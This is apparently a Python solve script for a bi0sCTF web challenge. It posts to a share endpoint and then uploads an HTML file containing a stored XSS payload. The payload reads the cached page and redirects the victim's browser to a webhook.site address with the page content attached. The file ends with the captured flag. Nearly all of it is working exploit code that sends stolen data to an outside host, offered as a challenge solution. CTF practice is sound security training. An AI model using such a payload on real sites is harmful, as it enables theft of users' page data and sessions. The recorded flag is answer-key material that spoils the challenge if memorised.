import httpx
import time

CHALL_URL = "https://ch16496143432.ch.eng.run"
CHALL_URL = "http://localhost:3000"


def share() -> None:
    with httpx.Client(base_url=CHALL_URL) as client:
        try:
            r = client.post("/share", json={"id": "x"}, timeout=1)
            print(r.text)
        except httpx.ReadTimeout:
            pass
    print("shared")


def xss() -> None:
    print("XSS")
    payload = """
<script>
fetch('/', {
    cache: 'force-cache',
}).then(r => r.text()).then(r => {
    location = 'https://webhook.site/49bf9d14-dc50-4582-a5f7-d35ad68edc26/?f='+encodeURIComponent(r);
});
</script>
""".strip()
    with httpx.Client(base_url=CHALL_URL) as client:
        client.cookies["sid"] = "."
        r = client.post("/upload", files={"image": ("index.html", payload)})
        print(r.text)

    print("result:")
    with httpx.Client(base_url=CHALL_URL) as client:
        r = client.get("/?f=x")
        print(r.text)


share()
time.sleep(2)
xss()

# https://ch16496143432.ch.eng.run/5b47c243-b5ee-45ba-b7bb-b569b24bbff0/flag.txt
# bi0sctf{Tqle5HDnV8FHmQHcumjKhw==}